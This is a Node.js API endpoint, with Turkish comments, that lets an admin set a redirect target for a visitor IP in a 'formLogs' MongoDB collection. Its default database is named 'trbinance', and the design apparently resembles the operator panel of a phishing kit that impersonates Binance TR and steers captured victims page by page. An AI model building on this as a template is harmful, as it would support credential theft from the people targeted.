const clientPromise = require('../../lib/mongo');
const { verifyAdmin } = require('../../lib/auth');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    await verifyAdmin(req);

    const body = await readBody(req);
    const { ip, redirectTo } = body || {};

    if (!ip || !redirectTo) {
      return res.status(400).json({ error: 'IP and redirectTo are required' });
    }

    // Retry mekanizması ile MongoDB işlemini yap - kayıt garanti edilene kadar dene
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 1000; // 1 saniye
    
    let success = false;
    let lastError;
    
    while (retryCount < maxRetries && !success) {
      try {
        const client = await clientPromise;
        
        // Bağlantı kontrolü - ping ile test et
        try {
          await client.db('admin').command({ ping: 1 });
        } catch (pingErr) {
          if (retryCount < maxRetries - 1) {
            console.log(`MongoDB connection check failed, retrying... (${retryCount + 1}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, retryDelay * (retryCount + 1)));
            retryCount++;
            continue;
          }
        }
        
        const db = client.db(process.env.MONGODB_DB || 'trbinance');
        const logs = db.collection('formLogs');

        const now = new Date();

        const result = await logs.updateOne(
          { ip },
          {
            $set: {
              redirectTo: String(redirectTo).slice(0, 200),
              redirectAt: now,
              updatedAt: now
            },
            $setOnInsert: {
              ip,
              page: 'unknown',
              createdAt: now
            }
          },
          { upsert: true }
        );

        // MongoDB'ye kaydın başarıyla yapıldığından emin ol
        if (result.acknowledged !== true) {
          throw new Error('Database write not acknowledged');
        }
        
        success = true;
      } catch (err) {
        lastError = err;
        retryCount++;
        
        const isConnectionError = 
          err.message?.includes('timeout') ||
          err.message?.includes('ECONNREFUSED') ||
          err.message?.includes('ENOTFOUND') ||
          err.message?.includes('MongoServerSelectionError') ||
          err.message?.includes('connection') ||
          err.message?.includes('not acknowledged');
        
        if (isConnectionError && retryCount < maxRetries) {
          console.log(`MongoDB operation failed, retrying... (${retryCount}/${maxRetries}): ${err.message}`);
          await new Promise(resolve => setTimeout(resolve, retryDelay * retryCount));
        } else {
          // Retry yapılamayacak hata veya max retry'a ulaşıldı
          break;
        }
      }
    }
    
    if (!success) {
      console.error(`MongoDB operation failed after ${retryCount} attempts:`, lastError?.message);
      throw new Error(`Database write failed after retries: ${lastError?.message}`);
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    if (err.code === 401) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    if (err.code === 500) {
      return res.status(500).json({ error: 'Server misconfigured' });
    }
    console.error('Redirect API error', err);
    return res.status(500).json({ error: 'Internal server error', message: err.message });
  }
};

